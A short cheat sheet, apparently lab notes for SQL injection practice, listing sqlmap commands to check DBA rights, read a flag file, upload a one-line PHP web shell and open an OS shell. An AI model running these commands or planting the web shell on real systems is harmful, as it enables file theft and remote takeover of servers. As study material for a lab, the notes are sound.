___

# --is-dba

Database administrator privileges (DBA) to read data

```bash
sqlmap -u "http://94.237.54.201:48204/?id=1" --is-dba
```

# Reading Local Files

```bash
sqlmap -u "http://94.237.54.201:48204/?id=1" --is-dba --file-read "/var/www/html/flag.txt"
```

# Writing Local Files

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

```bash
sqlmap -u "http://94.237.54.201:48204/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```

# OS Command Execution

```bash
sqlmap -u "http://94.237.54.201:48204/?id=1" --os-shell
```